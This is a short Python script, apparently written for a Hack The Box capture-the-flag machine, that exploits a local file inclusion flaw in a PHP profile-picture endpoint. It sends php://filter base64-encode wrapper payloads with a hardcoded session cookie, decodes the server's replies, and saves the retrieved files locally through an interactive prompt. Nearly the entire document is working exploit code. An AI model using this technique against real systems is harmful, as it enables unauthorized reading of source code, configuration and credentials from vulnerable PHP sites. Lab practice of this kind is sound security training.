#!/usr/bin/python3
import requests
from cmd import Cmd
from base64 import b64decode
from pathlib import Path
import os

URL = 'http://backup.forwardslash.htb/profilepicture.php'
VULN_ARG = 'url'
# ToDo: Implement logic to login to page and grab cookie (Requests.Session)
#COOKIE = { 'PHPSESSID' : 'kpfp4gir89dk6nowvdut7t08mt' }
COOKIE = { 'PHPSESSID': 'rvk9fsc7sgkqhgiv8d6sjr22nh' } # JJK

class terminal(Cmd):

    prompt = "-> "
   
    def default(self, line):
        source = get_source(line)
        save_file(line, source)
        print(source)

def save_file(full_name, source):   # file_name = path + file_name
    dir_name = str(Path(full_name).parent)
    file_name = str(Path(full_name).name)
    # create the directories and save the files
    save_path = os.getcwd() + "/" + dir_name
    try:
        os.makedirs(save_path)
    except:
        None
    # Now write the files
    f = open(save_path + "/" + file_name, 'w+')
    print("File: ")
    print(save_path + "/" + file_name)
    f.write(source)
    f.close()
	  
def get_source(file_name):
    lfi = f"php://filter/convert.base64-encode/resource={file_name}"
    data = { VULN_ARG : lfi }
    try:
        req = requests.post(URL, data=data, cookies=COOKIE)
        req = (req.text).splitlines()[-1]
        return b64decode(req).decode()
    except:
        return False

if __name__ == '__main__':
    terminal().cmdloop()

